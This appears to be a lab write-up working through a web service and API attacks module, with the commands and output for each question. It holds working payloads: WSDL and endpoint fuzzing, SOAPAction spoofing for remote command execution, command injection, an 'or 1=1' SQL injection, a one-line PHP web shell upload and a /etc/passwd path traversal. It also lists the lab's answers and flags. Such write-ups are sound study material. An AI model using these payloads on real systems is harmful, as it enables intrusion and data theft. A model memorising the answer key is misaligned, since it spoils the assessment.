[Web Services Description Language (WSDL)]

[*] Target: 10.129.142.151:3002/wsdl

[Question 1]  If you should think of the operation object in WSDL as a programming concept, which of the following is closer in terms of the provided functionality?
              Answer options (without quotation marks): "Data Structure", "Method", "Class")

    # curl http://10.129.142.151:3002/wsdl => Nothing

    => Maybe there is a parameter that will provide us with access to the SOAP web service's WSDL file 

    # ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://10.129.142.151:3002/wsdl?FUZZ' -fs 0 

            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       

            v2.0.0-dev
        ________________________________________________

        :: Method           : GET
        :: URL              : http://10.129.142.151:3002/wsdl?FUZZ
        :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
        :: Follow redirects : false
        :: Calibration      : false
        :: Timeout          : 10
        :: Threads          : 40
        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
        :: Filter           : Response size: 0
        ________________________________________________

        [Status: 200, Size: 4461, Words: 967, Lines: 186, Duration: 237ms]
            * FUZZ: WSDL

        [Status: 200, Size: 4461, Words: 967, Lines: 186, Duration: 231ms]
            * FUZZ: wsdl

    Note: WSDL files can be found in many forms, such as /example.wsdl, ?wsdl, /example.disco, ?disco etc. DISCO is a Microsoft technology for publishing and discovering Web Services.

    = So in the http://10.129.142.151:3002/wsdl?WSDL you can see the code right, I think "Method" is the closest in terms of the provided functionality

    [!] Answer: "Method"


[SOAPAction Spoofing]

[*] Target: 10.129.142.151

[Question 1] Exploit the SOAPAction spoofing vulnerability and submit the architecture of the web server as your answer. Answer options (without quotation marks): "x86_64", "x86"

    - Using the RCE_SOAP.py (which I already uploaded with this writeup) you can find the target's architecture

    $ python3 RCE_SOAP.py

    >> Enter the target IP: 10.129.142.151

    $ uname -m
    b'<?xml version="1.0" encoding="utf-8"?>...<success>true</success><result>x86_64\n</result></LoginResponse></soap:Body></soap:Envelope>'

    [!] Answer: "x86_64"


[Command Injection]

[*] Target: 10.129.142.151 

[Question 1]  Exploit the command injection vulnerability of the target to execute an "id" command. 
              Submit the privileges under which the server is running as your answer. Answer options (without quotation marks): "user", "www-data", "root"

    - Because they already tell you so detail about these vulnerabilities, I think I don't need to explain it again

        # curl http://10.129.142.151:3003/ping-server.php/system/id
        uid=0(root) gid=0(root) groups=0(root)

    [!] Answer: "root"

[Question 2] To execute commands featuring arguments via http://<TARGET IP>:3003/ping-server.php/system/{cmd} you may have to use ______. 
             Answer options (without quotation marks): "Encryption", "Hashing", "URL Encoding"

    [!] Answer: "URL Encoding"


[Information Disclosure (with a twist of SQLi)]

[*] Target: 10.129.202.133:3003

[Question 1] What is the username of the third user (id=3)?

    - So I guess http://10.129.202.133:3003?id=3 ?? => [{"id":"3","username":"WebServices","position":"3"}] =))

    [!] Answer: "WebServices"

[Question 2] Identify the username of the user that has a position of 736373 through SQLi. Submit it as your answer.

    - Oke in this situation, we need something kind of always true condition

    http://10.129.202.133:3003/?id=3%20or%201=1 => ... {"id":"8374932","username":"HTB{THE_FL4G_FOR_SQLI_IS_H3RE}","position":"736373"}

    [!] Answer: "HTB{THE_FL4G_FOR_SQLI_IS_H3RE}"


[Arbitrary File Upload]

[*] Target: 10.129.202.133:3001

[Question 1] Achieve remote code execution and submit the server's hostname as your answer.

    - I went to the http://10.129.202.133:3001/ and uploaded RCE.php which containts <?php system($_REQUEST['cmd']); ?>

        => Your file is uploaded to /uploads/RCE.php

    => http://10.129.202.133:3001/uploads/RCE.php?cmd=hostname => nix01-websvc

    [!] Answer: "nix01-websvc"


[Local File Inclusion (LFI)]

[*] Target: 10.129.202.133:3000/api

[Question 1] Through the LFI vulnerability identify an existing user on the server whose name starts with "ub". Answer format: ub****

    - I think we all know the format of /api right =)) /api/upload, /api/email ....

    # ffuf -w /opt/useful/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://10.129.202.133:3000/api/FUZZ

            /'___\  /'___\           /'___\       
           /\ \__/ /\ \__/  __  __  /\ \__/       
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
             \ \_\   \ \_\  \ \____/  \ \_\       
              \/_/    \/_/   \/___/    \/_/       

        v2.0.0-dev
    ________________________________________________

    :: Method           : GET
    :: URL              : http://10.129.202.133:3000/api/FUZZ
    :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
    ________________________________________________

    [Status: 200, Size: 71, Words: 5, Lines: 1, Duration: 224ms]
        * FUZZ: download

    :: Progress: [174/174] :: Job [1/1] :: 112 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

    => Good so /api/download exists 

    # curl http://10.129.202.133:3000/api/download/%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
                
    {"success":false,"error":"Input the filename via /download/<filename>"} 

    Yeah! but we need to read the /etc/password, (you can use the CBBH_LFI.txt I uploaded in File Inclusion section or just exploit it manually)

        => ffuf -w CBBH_LFI.txt -u http://10.129.202.133:3000/api/download/FUZZ -fs 43

        => http://10.129.202.133:3000/api/download/..%2f..%2f..%2fetc%2fpasswd, Now you got your "_etc_passwd"

        => ubuntu:x:1000:1000::/home/ubuntu:/bin/bash

    [!] Answer: "ubuntu"

[Note] Almost the rest just are "Yes/No" questions, read them carefully and you will know the answer


[Web Service & API Attacks - Skills Assessment]

[*] Target: 10.129.202.133:3002/wsdl?wsdl

[Question 1] Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. 
             Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise, it will hang or throw an error.

    - This is the same machine as SOAPAction Spoofing's machine right =))) Think outside the box =))

        $ python3 RCE_SOAP.py

        >> Enter the target IP: 10.129.77.231

        $ pwd  
        b'...<result>/app/soap-wsdl\n</result></LoginResponse></soap:Body></soap:Envelope>'
        $ grep -r "FLAG{" /app 
        b'...FLAG{1337_SQL_INJECTION_IS_FUN_:)}&apos;\r\n</result></LoginResponse></soap:Body></soap:Envelope>'

        [!] Answer: "FLAG{1337_SQL_INJECTION_IS_FUN_:)}"

    [!] ANswer: "FLAG{1337_SQL_INJECTION_IS_FUN_:)}"




